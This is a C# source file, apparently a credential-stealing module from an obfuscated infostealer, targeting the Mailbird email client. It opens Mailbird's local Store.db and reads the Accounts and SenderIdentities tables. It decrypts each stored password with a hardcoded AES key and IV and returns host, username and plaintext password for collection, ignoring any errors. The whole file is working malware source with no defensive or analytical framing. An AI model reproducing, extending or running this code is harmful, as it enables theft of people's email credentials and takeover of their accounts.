using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using C6Zy;
using rCOGWW;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Mailbird : EtbH
	{
		public Mailbird()
		{
			this.RlQ9LyeE = "Mailbird";
		}

		public string RlQ9LyeE { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();

			list.AddRange(Mailbird.fklpWKbbI("SenderIdentities"));
			list.AddRange(Mailbird.fklpWKbbI("Accounts"));

			return list;
		}

        private static List<WTitxI2m> fklpWKbbI(string tableName = "Accounts")
        {
            List<WTitxI2m> list = new List<WTitxI2m>();
            string dbPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Mailbird",
                "Store",
                "Store.db"
            );

            if (!File.Exists(dbPath))
                return list;

            byte[] key = new byte[]
            {
                53, 224, 133, 48, 138, 109, 145, 163, 150, 95, 242, 55, 149, 209, 207, 54,
                113, 222, 126, 91, 98, 56, 213, 251, 219, 100, 166, 75, 211, 90, 5, 83
            };
            byte[] iv = new byte[]
            {
                152, 15, 104, 206, 119, 67, 76, 71, 249, 233, 14, 130, 244, 107, 76, 235
            };

            btrVogW db;
            try
            {
                db = new btrVogW(dbPath);
            }
            catch
            {
                return list;
            }

            if (!db.f9NLCu(tableName) || db.unm() <= 0)
                return list;

            rliYkpvg decryptor = new rliYkpvg();

            for (int i = 0; i < db.unm(); i++)
            {
                try
                {
                    string host = db.jK2IxJ35o1(i, "Server_Host");
                    string username = db.jK2IxJ35o1(i, tableName == "Accounts" ? "Username" : "Email");
                    string encryptedPassword = db.jK2IxJ35o1(i, "EncryptedPassword");

                    string password = Encoding.UTF8.GetString(
                        decryptor.w2fMtP(Convert.FromBase64String(encryptedPassword), key, iv)
                    );

                    list.Add(new WTitxI2m
                    {
                        data4 = "Mailbird",
                        data2 = username,
                        data3 = password,
                        data1 = host
                    });
                }
                catch
                {
                }
            }

            return list;
        }
    }
}
